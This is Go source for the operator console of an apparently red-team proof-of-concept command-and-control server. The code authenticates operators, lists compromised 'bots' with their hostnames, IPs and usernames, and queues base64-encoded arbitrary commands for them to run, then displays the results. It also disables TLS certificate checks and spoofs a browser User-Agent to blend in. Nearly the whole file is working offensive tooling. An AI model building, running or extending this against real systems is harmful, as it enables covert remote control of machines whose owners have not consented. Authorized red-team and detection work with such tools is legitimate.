package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"

	cf "github.com/thepcn3rd/goAdventures/projects/commonFunctions"
)

/*
Purpose: Build a simple C2 server as a PoC
This is the operator part used by the red team operator.

go env -w GOROOT="/usr/lib/go"
go env -w GOPATH="/home/thepcn3rd/go/workspaces/c2operator/"

Make the directories - src
Copy the commonFunctions folder into the src directory so that it can be referenced

Create the operator config.json file, below is an example
{
        "serverURL": "https://127.0.0.1",
        "serverPort": "8000",
        "operator": "thepcn3rd",
        "operatorKey": "T0RjME1qaG1ZelV5TWpnd00yUX"
}

// To cross compile for linux
// GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o c2client.bin -ldflags "-w -s" main.go

// To cross compile windows
// GOOS=windows GOARCH=amd64 go build -o c2client.exe -ldflags "-w -s" main.go


Future Features:
Preview of commands executed for the host...
Toggle between powershell and cmd for the parent executable
Add upload and download function through the client...
Hide or Remove Clients that are no longer connected or stale

*/

type connectionStruct struct {
	ServerURL   string `json:"serverURL"`
	ServerPort  string `json:"serverPort"`
	Operator    string `json:"operator"`
	OperatorKey string `json:"operatorKey"`
}

type operatorStruct struct {
	OperatorRegistrationKey string `json:"operatorRegistrationKey"`
	OperatorName            string `json:"operatorName"`
	OperatorKey             string `json:"operatorKey"`
}

type operatorInformation struct {
	OperatorSessionKey string   `json:"operatorSessionKey"`
	ClientUUIDs        []string `json:"clientUUIDs"`
	ClientHostnames    []string `json:"clientHostnames"`
	ClientIPs          []string `json:"clientIPs"`
	Usernames          []string `json:"Usernames"`
	LastConnected      []string `json:"lastConnected"`
}

type botInformation struct {
	SelectedUUID string          `json:"botUUID"`
	HostnameBot  string          `json:"hostnameBot"`
	UsernameBot  string          `json:"usernameBot"`
	IPAddresses  string          `json:"ipAddresses"`
	OperatorName string          `json:"operatorName"`
	SessionKey   string          `json:"sessionKey"`
	LastCommands []commandStruct `json:"lastCommands"`
}

type commandStruct struct {
	CommandID         string `json:"commandID"`
	Command           string `json:"command"`
	Results           string `json:"results"`
	TSResultsReturned string `json:"tsResultsReturned"`
}

func webRequest(byteData []byte, url string, isJson bool, httpVerb string) []byte {
	var req *http.Request
	var err error

	// Skip the verification of a self-signed certificate
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	if httpVerb == "POST" {
		// Create a new POST request
		fmt.Println(url)
		req, err = http.NewRequest("POST", url, bytes.NewBuffer(byteData))
		cf.CheckError("Unable to send HTTP POST Request", err, true)
	} else if httpVerb == "GET" {
		// Create a new GET request
		req, err = http.NewRequest("GET", url, nil)
		cf.CheckError("Unable to send HTTP GET Request", err, true)
	}

	if isJson {
		// Set the appropriate headers for JSON content
		req.Header.Set("Content-Type", "application/json")
	}

	// Set the User-Agent to something other than Go-http-client/2.0
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.172 Safari/537.36")

	// Create an HTTP client
	client := &http.Client{}

	// Send the POST request
	resp, err := client.Do(req)
	cf.CheckError("Unable to send the HTTP request to the server", err, true)
	defer resp.Body.Close()

	// Read the response body
	respBody, err := io.ReadAll(resp.Body)
	cf.CheckError("Unable to read the response provided by the server", err, true)

	// Print the response status code and body
	fmt.Println("Response Status:", resp.Status)
	//fmt.Println("Response Body:", string(respBody))

	return respBody
}

func createOperator(url string) {
	var opStruct operatorStruct

	// Read the Operator Registration Key
	scannerRKey := bufio.NewScanner(os.Stdin)
	fmt.Print("Operator registration key: ")
	if !scannerRKey.Scan() {
		fmt.Println("Error reading input:", scannerRKey.Err())
		return
	}
	opStruct.OperatorRegistrationKey = scannerRKey.Text()

	// Read the Operator Name
	scannerName := bufio.NewScanner(os.Stdin)
	fmt.Print("Operator Name: ")
	if !scannerName.Scan() {
		fmt.Println("Error reading input:", scannerName.Err())
		return
	}
	opStruct.OperatorName = scannerName.Text()

	// Read the Operator Key
	scannerKey := bufio.NewScanner(os.Stdin)
	fmt.Print("Operator Key: ")
	if !scannerKey.Scan() {
		fmt.Println("Error reading input:", scannerKey.Err())
		return
	}
	opStruct.OperatorKey = base64.StdEncoding.EncodeToString([]byte(scannerKey.Text()))

	jsonData, err := json.Marshal(opStruct)
	cf.CheckError("Unable to create the json data from cmdStruct", err, true)

	responseBody := webRequest(jsonData, url, true, "POST")
	fmt.Println("Response Body: ", string(responseBody))
	if string(responseBody) == "Operator Created" {
		fmt.Println("Add the operator name and key that was created into the config.json file to authenticate")
	}
}

func authOperator(url string, operator string, key string) []byte {
	var opStruct operatorStruct
	opStruct.OperatorName = operator
	// Base64 encode the key that is in config.json and send across
	opStruct.OperatorKey = base64.StdEncoding.EncodeToString([]byte(key))
	fmt.Println(opStruct)
	jsonData, err := json.Marshal(opStruct)
	cf.CheckError("Unable to create the json data from opStruct in authOperator", err, true)
	responseBody := webRequest(jsonData, url, true, "POST")
	// The response returns:
	// Unique Session Token (Good for 8 hours)
	// Bot IDs of Available Bots
	fmt.Println("Auth Operator Response Body: ", string(responseBody))

	return responseBody
}

func selectBot(opInfo operatorInformation) string {
	var colorReset = "\033[0m"
	var colorGreen = "\033[32m"
	selectionBot := bufio.NewScanner(os.Stdin)

	fmt.Println("\nSelect a Bot from the Following List")
	fmt.Println("----------------------------------------")
	for index, bot := range opInfo.ClientUUIDs {
		fmt.Println(colorGreen + "UUID: " + bot + colorReset + "\nServer:" + opInfo.ClientHostnames[index] + " Address:" + opInfo.ClientIPs[index] + " Username:" + opInfo.Usernames[index] + " Last Connected:" + opInfo.LastConnected[index] + "\n")
	}
	fmt.Print("\nSelect the Bot UUID to interact with: ")
	if !selectionBot.Scan() {
		fmt.Println("Error reading input: ", selectionBot.Err())
		return "Not Selected"
	}
	botUUID := selectionBot.Text()

	return botUUID
}

func gatherInfoBot(url string, botInfo botInformation) []byte {
	jsonData, err := json.Marshal(botInfo)
	cf.CheckError("Unable to create the json data from botInfo in gatherInfoBot", err, true)

	responseBody := webRequest(jsonData, url, true, "POST")
	//fmt.Println("Response Body: ", string(responseBody))

	return responseBody
}

func addCommand(url string, botInfo botInformation) {

	var newBotInfo botInformation
	var newCommand commandStruct
	// Send a POST to add a command for the selected bot
	commandInput := bufio.NewScanner(os.Stdin)
	fmt.Print("(r to return) $ ")
	if !commandInput.Scan() {
		fmt.Println("Error reading input:", commandInput.Err())
		return
	}

	commandText := commandInput.Text()
	if commandText == "r" || commandText == "R" {
		// break out of the for loop
		//	break
	} else {
		newBotInfo.OperatorName = botInfo.OperatorName
		newBotInfo.SelectedUUID = botInfo.SelectedUUID
		newBotInfo.SessionKey = botInfo.SessionKey
		// Need to base64 encode the command when stored at the server
		//var encodedCommand string
		encodedCommand := base64.StdEncoding.EncodeToString([]byte(commandText))
		newCommand.Command = encodedCommand
		newBotInfo.LastCommands = append(newBotInfo.LastCommands, newCommand)

		jsonData, err := json.Marshal(newBotInfo)
		cf.CheckError("Unable to marshall the new bot info to json", err, true)
		fmt.Println("")
		responseBody := webRequest(jsonData, url, true, "POST")
		fmt.Println("Response Body: ", string(responseBody))
	}

}

func main() {

	var config connectionStruct
	var opInfo operatorInformation
	var botInfo botInformation
	var authSessionToken string
	authSessionStatus := "Not Authenticated"
	authSessionToken = "Not Authenticated"
	botUUID := "Not Selected"

	ConfigPtr := flag.String("config", "config.json", "Configuration file to load for the proxy")
	flag.Parse()

	// Load the config.json file
	fmt.Println("Loading the following config file: " + *ConfigPtr + "\n")
	configFile, err := os.Open(*ConfigPtr)
	cf.CheckError("Unable to open the configuration file", err, true)
	defer configFile.Close()
	decoder := json.NewDecoder(configFile)
	if err := decoder.Decode(&config); err != nil {
		cf.CheckError("Unable to decode the configuration file", err, true)
	}

	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Println("\n\nSelect an option:")
		fmt.Println("1. Create Operator")
		fmt.Println("2. Authenticate Operator - " + authSessionStatus + " - " + authSessionToken)
		if botUUID == "Not Selected" {
			fmt.Println("3. Select Bot")
		} else {
			fmt.Println("3. Select New Bot - Bot: " + botInfo.SelectedUUID)
		}
		// Returns a query of the bots available, select the bot to interact with (how to build a dynamic menu with multiple bots)...
		// Returns the the last command with results, save all the commands executed to a file and add commands
		// - How does the webserver handle large amounts of output from the results of the commands...
		fmt.Println("4. Add Command")
		// 5. Download all results and store in database locally...
		//fmt.Println("9. Remove Bot")
		fmt.Println("Exit (i.e. E, e, Exit, exit)")
		fmt.Print("Enter your choice: ")

		if !scanner.Scan() {
			fmt.Println("Error reading input:", scanner.Err())
			return
		}

		serverURL := config.ServerURL + ":" + config.ServerPort
		choice := scanner.Text()

		switch choice {
		case "1":
			fmt.Println("You selected to create an operator...")
			createOperatorURL := serverURL + "/api/co"
			createOperator(createOperatorURL)
			// Operator Password - echo "a" | sha256sum | base64
		case "2":
			// Returns a one time token to use during the duration of the session
			fmt.Println("You selected to authenticate your operator...")
			authOperatorURL := serverURL + "/api/ao"
			opInfoBytes := authOperator(authOperatorURL, config.Operator, config.OperatorKey)
			err = json.Unmarshal(opInfoBytes, &opInfo)
			cf.CheckError("Unable to unmarshall the json for OpInfo", err, true)
			//fmt.Println(opInfo.OperatorSessionKey)
			if len(opInfo.OperatorSessionKey) > 60 {
				authSessionStatus = "Authenticated"
				authSessionToken = opInfo.OperatorSessionKey
			}
			//fmt.Println(authSessionToken)
		case "3":
			botInfo.SelectedUUID = selectBot(opInfo)
			botUUID = "Selected"
			botInfo.SessionKey = opInfo.OperatorSessionKey
			botInfo.OperatorName = config.Operator
			// Clear the last commands when selecting a new bot...
			botInfo.LastCommands = []commandStruct{}
			gatherInfoBotURL := serverURL + "/api/gi"
			responseBotInfoBytes := gatherInfoBot(gatherInfoBotURL, botInfo)
			// Read the bot then query the last commands and results...
			var returnedBotInfo botInformation
			//fmt.Println(responseBotInfoBytes)
			// Display the last commands and results
			err = json.Unmarshal(responseBotInfoBytes, &returnedBotInfo)
			cf.CheckError("Unable to unmarshall the response bot info bytes", err, true)
			//fmt.Printf("Returned UUID: %s\n", returnedBotInfo.SelectedUUID)
			//fmt.Printf("UUID: %s\n", botInfo.SelectedUUID)
			// Currently set to only return the last 5 commands...
			fmt.Printf("\nLast 5 commands pending or executed for selected UUID %s\n", botInfo.SelectedUUID)
			fmt.Println("-------------------------------------------------------------------------------------------------------------")
			if returnedBotInfo.SelectedUUID == botInfo.SelectedUUID {
				botInfo.LastCommands = returnedBotInfo.LastCommands
				for _, lastCommand := range botInfo.LastCommands {
					decodedCommand, err := base64.StdEncoding.DecodeString(lastCommand.Command)
					cf.CheckError("Unable to decode the command to display", err, false)
					fmt.Printf("Command ID: %s\n", lastCommand.CommandID)
					fmt.Printf("Command: %s\n", decodedCommand)
					fmt.Printf("Executed: %s\n", lastCommand.TSResultsReturned)
					decodedResults, err := base64.StdEncoding.DecodeString(lastCommand.Results)
					cf.CheckError("Unable to decode the results of last command", err, false)
					fmt.Printf("Results:\n%s\n", decodedResults)
					// Store the results in a local database, Create option to download all results from server
				}
			}

		case "4":
			fmt.Println("\nAdd Command")
			// Add code for Option 2 functionality
			addCommandURL := serverURL + "/api/ac"
			addCommand(addCommandURL, botInfo)
		case "E", "e", "Exit", "exit":
			fmt.Println("Exiting...")
			return
		default:
			fmt.Println("Invalid choice. Please select a valid option.")
		}
	}
}
